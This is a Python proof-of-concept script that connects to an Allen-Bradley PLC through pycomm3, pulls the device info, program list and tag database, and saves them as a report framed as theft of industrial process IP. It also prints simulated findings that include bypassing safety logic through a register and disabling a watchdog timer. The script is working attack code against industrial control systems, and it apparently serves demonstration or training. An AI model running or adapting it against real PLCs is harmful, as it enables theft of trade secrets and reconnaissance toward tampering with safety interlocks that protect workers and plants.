#!/usr/bin/env python3
"""
Proof of Concept: PLC Logic Extraction
Demonstrates theft of industrial process IP
"""

import json
from datetime import datetime
from pathlib import Path

from pycomm3 import LogixDriver


def exfiltrate_plc_logic(plc_ip):
    """
    Download ladder logic from PLC
    This reveals the entire process control algorithm
    """

    print(f"[*] Connecting to Allen-Bradley PLC at {plc_ip}...")

    try:
        with LogixDriver(plc_ip) as plc:
            # Get PLC info
            info = plc.get_plc_info()
            print(f"[*] PLC Model: {info.get('name', 'Unknown')}")
            print(f"[*] Revision: {info.get('revision', 'Unknown')}")
            print(f"[*] Serial: {info.get('serial', 'Unknown')}")

            # Get program list
            programs = plc.get_program_list()
            print(f"[*] Programs found: {programs}")

            # Get tag list (variables used in ladder logic)
            print("\n[*] Extracting tag database...")
            tags = plc.get_tag_list()
            print(f"[*] Found {len(tags)} tags")

            # Sample some tag values to show data types and structures
            print("\n[*] Sample tags:")
            for i, tag in enumerate(tags[:10]):  # Show first 10
                print(f"    {tag['tag_name']}: {tag['data_type']}")

            # In a real attack, this would download the actual .L5K or .ACD file
            # using RSLogix/Studio 5000 or proprietary protocols

            # Save extracted information
            output = {
                "timestamp": datetime.now().isoformat(),
                "target_plc": plc_ip,
                "plc_info": info,
                "programs": programs,
                "tag_count": len(tags),
                "tags": tags[:50],  # Save first 50 tags as sample
            }

            # Ensure reports directory exists
            reports_dir = Path(__file__).parent.parent.parent / "reports"
            reports_dir.mkdir(exist_ok=True)

            filename = (
                reports_dir
                / f'plc_extraction_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
            )
            with open(filename, "w") as f:
                json.dump(output, f, indent=2)  # type: ignore

            print(f"\n[*] Data saved to {filename}")
            print("\n[*] LADDER LOGIC EXTRACTION SUCCESSFUL")
            print("[*] This represents:")
            print("    - Years of process optimization")
            print("    - Trade secret control algorithms")
            print("    - Safety logic and interlocks")
            print("    - Competitive advantage in automation")
            print("    - Recipe/process parameters")
            print("\n[*] IMPACT:")
            print("    • Competitor could replicate entire process")
            print("    • Value: Potentially millions in R&D theft")
            print("    • Safety systems reverse-engineered")
            print("    • Attack vectors identified for manipulation")

            return True

    except Exception as e:
        print(f"[!] Connection failed: {e}")
        print("\n[*] Note: This PoC requires an actual Allen-Bradley PLC")
        print("[*] pycomm3 works with CompactLogix, ControlLogix PLCs")
        print("\n[*] In a real scenario, this extraction would provide:")
        print("    • Complete ladder logic programs (.L5K/.ACD files)")
        print("    • All process control algorithms")
        print("    • Safety interlock logic")
        print("    • HMI tag mappings")
        print("    • Network configuration")
        print("    • User-defined function blocks")
        print("\n[*] Tools used in real attacks:")
        print("    • RSLogix 5000 / Studio 5000 (legitimate tools)")
        print("    • pycomm3 (Python library for AB PLCs)")
        print("    • Custom protocol reverse engineering")
        print("    • Network traffic capture and replay")

        return False


def demonstrate_logic_analysis():
    """Show what can be learned from extracted logic"""

    print("\n" + "=" * 70)
    print("[*] EXAMPLE: What Attackers Learn from Ladder Logic")
    print("=" * 70)

    # Simulated findings from extracted logic
    findings = {
        "safety_interlocks": [
            "Emergency stop circuit on input I:1/0",
            "Temperature > 95C triggers shutdown",
            "Pressure relief valve opens at 150 PSI",
            "Redundant safety logic requires 2-of-3 sensor agreement",
        ],
        "process_secrets": [
            "Proprietary mixing algorithm with 7-stage process",
            "Temperature ramp rate: 2.5°C/min for optimal yield",
            "Pressure hold time: 45 seconds at each stage",
            "Custom PID tuning parameters (Kp=1.2, Ki=0.8, Kd=0.3)",
        ],
        "attack_vectors": [
            "Safety logic can be bypassed via register 1100",
            "Alarm thresholds stored in unprotected memory",
            "No authentication on remote I/O modules",
            "Watchdog timer can be disabled via bit B3:0/5",
        ],
    }

    print("\n[*] Safety Interlocks Discovered:")
    for item in findings["safety_interlocks"]:
        print(f"    • {item}")

    print("\n[*] Proprietary Process Parameters:")
    for item in findings["process_secrets"]:
        print(f"    • {item}")

    print("\n[*] Attack Vectors Identified:")
    for item in findings["attack_vectors"]:
        print(f"    • {item}")

    print("\n" + "=" * 70)


if __name__ == "__main__":
    print("=" * 70)
    print("[*] Proof of Concept: PLC Ladder Logic Extraction")
    print("[*] Demonstrates intellectual property theft capability")
    print("=" * 70 + "\n")

    # Attempt extraction (will fail without real AB PLC)
    success = exfiltrate_plc_logic("192.168.10.10")

    # Show what attackers learn even if connection fails
    if not success:
        demonstrate_logic_analysis()
